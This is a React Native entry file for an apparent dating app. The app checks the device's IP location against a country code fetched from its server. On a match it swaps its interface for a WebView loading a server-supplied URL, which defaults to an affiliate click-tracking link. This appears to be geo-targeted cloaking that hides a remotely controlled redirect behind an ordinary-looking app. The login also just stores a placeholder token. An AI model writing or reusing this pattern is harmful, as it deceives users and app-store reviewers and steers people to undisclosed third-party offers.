/**
 * Sample React Native App
 * https://github.com/facebook/react-native
 *
 * @format
 */
import {NavigationContainer} from '@react-navigation/native';
import React, {useEffect, useState} from 'react';
import {Main} from "./components/MainLayout/Main.tsx";
import {Authorization} from "./components/Authorization/Authorization.tsx";
import {Registration} from "./components/Registration/Registration.tsx";
import {createNativeStackNavigator} from "@react-navigation/native-stack";
import AsyncStorage from "@react-native-async-storage/async-storage";
import {WebViewComponent} from "./components/WebView/WebView.tsx";
import {Loader} from "./components/Loader/Loader.tsx";
import {BASE_URL} from "./constDating";

export interface DeviceData {
    "IPv4": string,
    "city": string,
    "country_code": string,
    "country_name": string,
    "latitude": number,
    "longitude": number,
    "postal": string,
    "state": string
}

const Stack = createNativeStackNavigator();

function App(): React.JSX.Element {
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    const [deviceData, setDeviceData] = useState<DeviceData | null>(null);
    const [isWebView, setIsWebView] = useState(false);
    const [webViewPath, setWebViewPath] = useState('https://co.afcgo.pro/click?pid=62767&offer_id=25');
    const [country, setSetCountry] = useState<string>('');

    useEffect(() => {
        checkAuthentication();
    }, []);

    const checkAuthentication = async () => {
        const token = await AsyncStorage.getItem('token');
        setIsAuthenticated(token ? true : false);
    };

    const handleLogin = async () => {
        await AsyncStorage.setItem('token', 'your_token_here');
        setIsAuthenticated(true);
    };

    const handleLogout = async () => {
        await AsyncStorage.removeItem('token');
        await AsyncStorage.removeItem('currentPhotoIndex');
        setIsAuthenticated(false);
    };

    const getInfo = async () => {
        try {
            const data = await fetch('https://geolocation-db.com/json/')
            const deviceData = await data.json()
            setDeviceData(deviceData)
        } catch (error) {
            console.log("setDeviceDataerror", error)
        }
    }
    const getData = async () => {
        try {
            const conditionData = await fetch(`${BASE_URL}/country`)
            const data = await conditionData.json()
            setSetCountry(data.code)

        } catch (error) {
            console.log(error)
        }
    }
    const getWebViewPath = async () => {
        return fetch(`${BASE_URL}/string`).then((response) => response.json())
    }

    useEffect(() => {
        if (country) {
            getInfo()
        }
    }, [country]);

    useEffect(() => {
        getData()

    }, [])

    useEffect(() => {
        if (deviceData?.country_code == country) {
            getWebViewPath().then((data) => {
                setWebViewPath(data.url)
                setIsWebView(true)
            })
        } else {
            setIsWebView(false)
        }

    }, [deviceData, country])

    if (country && !deviceData) return <Loader/>

    if (isWebView) return <WebViewComponent uri={webViewPath}/>

    return (
        <NavigationContainer>
            <Stack.Navigator>
                {isAuthenticated ? <Stack.Screen name='home'>
                        {(props) => <Main {...props} handleLogout={handleLogout}/>}
                    </Stack.Screen>
                    : <>
                        <Stack.Screen name="auth">
                            {(props) => <Authorization {...props} handleLogin={handleLogin}/>}
                        </Stack.Screen>
                        <Stack.Screen name="registration">
                            {(props) => <Registration {...props} handleLogin={handleLogin}/>}
                        </Stack.Screen>
                    </>}
            </Stack.Navigator>
        </NavigationContainer>
    );
}


export default App;
